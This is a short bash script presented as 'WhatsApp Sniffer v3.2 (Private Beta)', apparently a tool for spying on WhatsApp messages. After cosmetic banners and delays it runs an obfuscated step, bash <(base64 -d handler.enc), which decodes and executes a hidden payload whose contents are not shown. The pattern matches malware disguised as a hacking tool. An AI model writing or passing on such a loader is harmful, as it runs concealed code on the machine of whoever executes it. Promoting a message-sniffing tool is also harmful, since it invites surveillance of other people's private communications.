#!/bin/bash
clear
echo "=============================================" | lolcat
echo "   WhatsApp Sniffer v3.2 (Private Beta)" | lolcat
echo "=============================================" | lolcat
sleep 2
echo "[*] Loading handler modules..." | lolcat
sleep 2
bash <(base64 -d handler.enc)
